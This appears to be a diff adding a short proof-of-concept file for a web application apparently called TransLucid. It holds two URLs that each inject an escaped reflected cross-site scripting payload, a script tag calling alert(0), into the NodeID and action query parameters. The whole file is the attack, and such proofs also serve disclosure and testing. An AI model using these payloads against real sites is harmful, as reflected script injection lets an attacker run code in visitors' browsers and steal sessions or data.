@@ -1,0 +1,3 @@
+http://www.example.com/translucid/transLucid_175/?NodeID=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
+
+http://www.example.com/translucid/transLucid_175/?action=&quot;&gt;&lt;script&gt;alert(0)&lt;/script&gt;
